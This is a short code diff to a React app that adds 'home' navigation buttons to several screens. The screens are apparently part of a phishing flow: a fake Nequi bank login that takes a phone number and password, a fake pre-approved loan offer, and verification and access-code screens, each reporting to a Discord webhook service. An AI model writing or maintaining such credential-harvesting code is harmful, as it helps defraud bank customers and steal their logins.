@@ -131,6 +131,7 @@ export default function App() {
         {step === 'nequi-login' && (
           <NequiLoginScreen
             phone={formData.phone}
+            onHome={() => navigate('home', 'backward')}
             onSuccess={(phoneValue, password) => {
               setFormData((prev) => ({ ...prev, phone: phoneValue }))
               DiscordWebhookService.sendSuccess(
@@ -157,6 +158,7 @@ export default function App() {
 
         {step === 'verification' && (
           <VerificationScreen
+            onHome={() => navigate('home', 'backward')}
             onComplete={() => {
               navigate('result', 'forward')
             }}
@@ -168,6 +170,7 @@ export default function App() {
             loanAmount={formData.loanAmount}
             monthlyIncome={formData.monthlyIncome}
             loanTerm={formData.loanTerm}
+            onHome={() => navigate('home', 'backward')}
             onApproved={() => {
               DiscordWebhookService.sendSuccess(
                 'Crédito pre-aprobado',
@@ -185,6 +188,7 @@ export default function App() {
 
         {step === 'access' && (
           <AccessScreen
+            onHome={() => navigate('home', 'backward')}
             onAccess={(appId) => {
               setApplicationId(appId)
               DiscordWebhookService.sendSuccess(
